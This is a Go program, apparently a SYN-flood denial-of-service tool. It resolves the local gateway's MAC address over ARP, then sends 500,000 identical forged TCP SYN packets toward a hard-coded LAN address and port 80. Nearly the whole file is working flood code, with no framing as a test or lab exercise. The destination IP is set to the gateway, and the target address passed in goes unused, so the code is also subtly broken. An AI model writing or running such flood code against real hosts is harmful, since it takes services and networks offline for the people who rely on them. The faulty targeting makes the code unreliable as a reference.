package main

import (
	"bytes"
	"fmt"
	"github.com/gopacket/gopacket"
	"github.com/gopacket/gopacket/layers"
	"github.com/gopacket/gopacket/pcap"
	"github.com/jackpal/gateway"
	"github.com/libp2p/go-netroute"
	"log"
	"net"
	"strconv"
	"strings"
	"time"
)

var ipAddr string
var port uint16

func sendRemoteMacAddrRequest(srcIp []byte, gwAddr []byte, srcMac *net.HardwareAddr, handle *pcap.Handle) {
	var err error

	eth := layers.Ethernet{
		SrcMAC:       *srcMac,
		DstMAC:       net.HardwareAddr{0xff, 0xff, 0xff, 0xff, 0xff, 0xff},
		EthernetType: layers.EthernetTypeARP,
	}

	arp := layers.ARP{
		AddrType:          layers.LinkTypeEthernet,
		Protocol:          layers.EthernetTypeIPv4,
		HwAddressSize:     6,
		ProtAddressSize:   4,
		Operation:         layers.ARPRequest,
		SourceHwAddress:   *srcMac,
		SourceProtAddress: srcIp,
		DstHwAddress:      []byte{0, 0, 0, 0, 0, 0},
		DstProtAddress:    gwAddr,
	}

	buf := gopacket.NewSerializeBuffer()

	opts := gopacket.SerializeOptions{
		FixLengths:       true,
		ComputeChecksums: true,
	}
	err = gopacket.SerializeLayers(buf, opts, &eth, &arp)

	if err != nil {
		panic(err)
	}

	err = handle.WritePacketData(buf.Bytes())

	if err != nil {
		panic(err)
	}
}

func readRemoteMacAddr(handle *pcap.Handle, iface *net.Interface, stop chan struct{}, addrChan chan net.HardwareAddr) {
	src := gopacket.NewPacketSource(handle, layers.LayerTypeEthernet)
	in := src.Packets()

	for {
		var packet gopacket.Packet

		select {
		case <-stop:
			return

		case packet = <-in:
			arpLayer := packet.Layer(layers.LayerTypeARP)
			if arpLayer == nil {
				continue
			}
			arpData := arpLayer.(*layers.ARP)
			if arpData.Operation != layers.ARPReply || bytes.Equal(iface.HardwareAddr, arpData.SourceHwAddress) {
				// This is a packet I sent.
				continue
			}

			addrChan <- arpData.SourceHwAddress

		}
	}
}

func getRemoteMacAddr(srcIp []byte, gwAddr []byte, srcMac *net.HardwareAddr, handle *pcap.Handle, iface *net.Interface) net.HardwareAddr {
	stop := make(chan struct{})
	defer close(stop)
	var addrChan = make(chan net.HardwareAddr)

	go readRemoteMacAddr(handle, iface, stop, addrChan)

	sendRemoteMacAddrRequest(srcIp, gwAddr, srcMac, handle)

	select {
	case addr := <-addrChan:
		return addr
	}
}

//func getNetAddrBySrcIP(srcIp net.IP) (*net.IPNet, error) {
//	ifacesAddresses, err := net.InterfaceAddrs()
//
//	if err != nil {
//		panic(err)
//	}
//
//	for _, address := range ifacesAddresses {
//		ip, network, err := net.ParseCIDR(address.String())
//		fmt.Println(ip)
//		if err != nil {
//			return nil, err
//		}
//		if network.Contains(srcIp) {
//			return network, nil
//		}
//	}
//	return nil, nil
//}

func parseIp4(ipRaw net.IP) []byte {
	parsedIp := []byte{0, 0, 0, 0}
	strOctets := strings.Split(ipRaw.String(), ".")

	for i := 0; i < 4; i++ {
		octetInt, err := strconv.Atoi(strOctets[i])

		if err != nil {
			panic("Failed to prepare IP")
		}
		parsedIp[i] = byte(octetInt)
	}
	return parsedIp
}

func spamSyn(ifaceName string, srcIp net.IP, dstIp net.IP, srcMac net.HardwareAddr, dstMac net.HardwareAddr, srcPort uint16, dstAddr net.IP, dstPort uint16) {
	ethl := layers.Ethernet{
		SrcMAC:       srcMac,
		DstMAC:       dstMac,
		EthernetType: layers.EthernetTypeIPv4,
	}

	ip4l := layers.IPv4{
		SrcIP:    srcIp,
		DstIP:    dstIp,
		Version:  4,
		TTL:      64,
		Protocol: layers.IPProtocolTCP,
	}

	tcpl := layers.TCP{
		SrcPort: layers.TCPPort(srcPort),
		DstPort: layers.TCPPort(dstPort),
		SYN:     true,
	}

	err := tcpl.SetNetworkLayerForChecksum(&ip4l)

	if err != nil {
		log.Printf("Error setting checksum: %v", err)
		return
	}

	buffer := gopacket.NewSerializeBuffer()

	opts := gopacket.SerializeOptions{
		FixLengths:       true,
		ComputeChecksums: true,
	}

	handleParameters, err := pcap.NewInactiveHandle(ifaceName)

	err = handleParameters.SetBufferSize(1024 * 1024 * 4)

	if err != nil {
		panic("Failed to set buffer size")
	}

	err = handleParameters.SetPromisc(false)
	if err != nil {
		panic("Failed to set buffer promisc")
	}

	err = handleParameters.SetSnapLen(0)
	if err != nil {
		panic("Failed to set Snaplen")
	}

	err = handleParameters.SetTimeout(time.Second * 3)
	if err != nil {
		panic("Failed to set timeout")
	}

	handle, err := handleParameters.Activate()
	if err != nil {
		log.Panic("Failed to activate handler")
	}

	if err != nil {
		log.Fatalf("Could not open device %s: %v", ifaceName, err)
	}
	defer handle.Close()

	err = gopacket.SerializeLayers(buffer,
		opts, &ethl, &ip4l, &tcpl)
	startTime := time.Now()
	for i := 0; i < 500000; i++ {

		err = handle.WritePacketData(buffer.Bytes())
		if err != nil {

			stat, _ := handle.Stats()
			fmt.Println(stat.PacketsReceived, stat.PacketsDropped)
			fmt.Println(time.Since(startTime))

			time.Sleep(20 * time.Millisecond)
		}
	}
}

func main() {
	//
	//fmt.Print("Enter addr and port: ")
	//_, err := fmt.Scanf("%s %s", &ipAddr, &port)

	ipAddr = "192.168.0.191"
	port = uint16(80)

	router, err := netroute.New()

	if err != nil {
		fmt.Println("Failed to create router")
		panic(err)
	}

	dstAddr := net.ParseIP(ipAddr)

	iface, gwIpRaw, srcIpRaw, err := router.Route(dstAddr)

	if gwIpRaw == nil {
		gwIpRaw, err = gateway.DiscoverGateway()
		if err != nil {
			return
		}
	}

	if srcIpRaw == nil {
		panic("Unable to find Source ip")
	}

	srcIpParsed := parseIp4(srcIpRaw)
	gwIpParsed := parseIp4(gwIpRaw)
	ifaceHwAddr := iface.HardwareAddr
	//netAddress, err := getNetAddrBySrcIP(srcIp)

	if err != nil {
		panic(err)
	}

	handle, err := pcap.OpenLive(iface.Name, 65536, true, pcap.BlockForever)

	gatewayMac := getRemoteMacAddr(srcIpParsed, gwIpParsed, &ifaceHwAddr, handle, iface)

	srcPort := uint16(54321)
	spamSyn(iface.Name, srcIpParsed, gwIpParsed, ifaceHwAddr, gatewayMac, srcPort, dstAddr, port)

}
